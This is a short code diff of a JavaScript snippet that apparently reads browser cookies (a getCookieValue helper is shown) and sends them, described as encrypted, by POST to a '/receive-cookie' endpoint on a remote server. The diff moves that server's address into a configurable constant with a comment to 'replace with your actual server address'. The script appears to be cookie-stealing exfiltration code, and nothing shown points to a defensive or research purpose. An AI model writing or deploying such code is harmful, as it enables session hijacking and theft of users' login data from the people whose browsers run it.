@@ -1,4 +1,7 @@
 (async function() {
+    // Define the server address
+    const serverAddress = 'https://172.27.48.1:3000'; // Replace with your actual server address
+
     // Function to get the value of a specified cookie
     function getCookieValue(cookieName) {
         const name = cookieName + "=";
@@ -80,7 +83,7 @@
 
     // Send encrypted data to the server
     try {
-        const response = await fetch('https://10.0.103.59:3000/receive-cookie', {
+        const response = await fetch(`${serverAddress}/receive-cookie`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
